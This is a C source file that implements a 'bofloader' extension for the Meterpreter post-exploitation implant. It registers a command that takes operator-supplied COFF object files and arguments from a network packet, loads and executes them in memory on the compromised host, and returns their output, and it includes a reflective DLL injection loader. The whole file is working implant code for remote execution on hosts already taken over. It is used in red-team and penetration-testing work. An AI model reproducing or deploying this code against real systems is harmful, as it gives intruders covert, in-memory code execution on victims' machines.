/*!
 * @file main.c
 * @brief Entry point for the bofloader extension.
 */

#include "common.h" 
#include "common_metapi.h" 
#include <stdint.h>
#include "main.h"
#include "beacon_compatibility.h"
#include "COFFLoader.h"

// Required so that use of the API works.
MetApi* met_api = NULL;
#define RDIDLL_NOEXPORT
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"


extern int LoadAndRun(char *argsBuffer, uint32_t bufferSize);
extern char * BeaconGetOutputData(int *outsize);

DWORD request_exec_cmd(Remote *remote, Packet *packet);

/*! @brief The enabled commands for this extension. */
Command customCommands[] =
{
	COMMAND_REQ(COMMAND_ID_BOFLOADER_EXEC_CMD, request_exec_cmd),
	COMMAND_TERMINATOR
};

static int LoadAndRun(char* argsBuffer, uint32_t bufferSize)
{
#if defined(_WIN32)
	// argsBuffer:  functionname |coff_data |  args_data
	datap parser;
	char* functionName;
	unsigned char* coff_data = NULL;
	unsigned char* arguments_data = NULL;
	int filesize = 0;
	int arguments_size = 0;

	BeaconDataParse(&parser, argsBuffer, bufferSize);
	functionName = BeaconDataExtract(&parser, NULL);
	if (functionName == NULL)
	{
		return 1;
	}
	coff_data = (unsigned char*)BeaconDataExtract(&parser, &filesize);
	if (coff_data == NULL)
	{
		return 1;
	}
	arguments_data = (unsigned char*)BeaconDataExtract(&parser, &arguments_size);
	if (arguments_data == NULL)
	{
		return 1;
	}

	return RunCOFF(functionName, coff_data, filesize, arguments_data, arguments_size);
#else
	return 0;
#endif
}

/*!
 * @brief Handler for the generic command execution function.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming packet.
 * @returns \c ERROR_SUCCESS
 */
DWORD request_exec_cmd(Remote *remote, Packet *packet)
{
	DWORD result = ERROR_SUCCESS;
	int outdata_size = 0;
	DWORD buffer_size = 0;
	Packet * response = met_api->packet.create_response(packet);
	char * output_data = NULL;
	char * args_buffer = NULL;

	dprintf("[BOFLOADER] Inside request cmd");
	if (NULL == response)
	{
		// Don't delete the response!
		return ERROR_OUTOFMEMORY;
	}

	buffer_size = packet->payloadLength;
	args_buffer = (char *) met_api->packet.get_tlv_value_raw(packet, TLV_TYPE_BOFLOADER_CMD_EXEC, &buffer_size);
	dprintf("[BOFLOADER] got pkt contents");

	if (args_buffer != NULL)
	{
		dprintf("[BOFLOADER] calling LoadAndRun(%p, %u)", args_buffer, buffer_size);
		if (LoadAndRun(args_buffer, (uint32_t)buffer_size))
		{
			dprintf("[BOFLOADER] load and run failed");
			result = ERROR_BAD_COMMAND;
		}
		else
		{
			dprintf("[BOFLOADER] getting out data");
			output_data = BeaconGetOutputData(&outdata_size);
		}
		
		if (output_data)
		{
			met_api->packet.add_tlv_string(response, TLV_TYPE_BOFLOADER_CMD_RESULT, output_data);
		}
	}
	else
	{
		result = ERROR_INVALID_PARAMETER;
	}

	dprintf("[BOFLOADER] Finished executing, if success will recv output data.");
	met_api->packet.transmit_response(result, remote, response);
	
	dprintf("[BOFLOADER] Done.");

	return ERROR_SUCCESS;
}

/*!
 * @brief Initialize the server extension.
 * @param api Pointer to the Meterpreter API structure.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */

DWORD InitServerExtension(MetApi* api, Remote* remote)
{
	dprintf("[BOFLOADER] Loading...");
	met_api = api;
	SET_LOGGING_CONTEXT(api)
	met_api->command.register_all(customCommands);
	dprintf("[BOFLOADER] Loaded.");


	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD DeinitServerExtension(Remote *remote)
{
	met_api->command.deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Do a stageless initialisation of the extension.
 * @param ID of the extension that the init was intended for.
 * @param buffer Pointer to the buffer that contains the init data.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD StagelessInit(UINT extensionId, const LPBYTE buffer, DWORD bufferSize)
{
	return ERROR_SUCCESS;
}

/*!
 * @brief Callback for when a command has been added to the meterpreter instance.
 * @param commandId The ID of the command that has been added.
 */
VOID CommandAdded(UINT commandId)
{
}
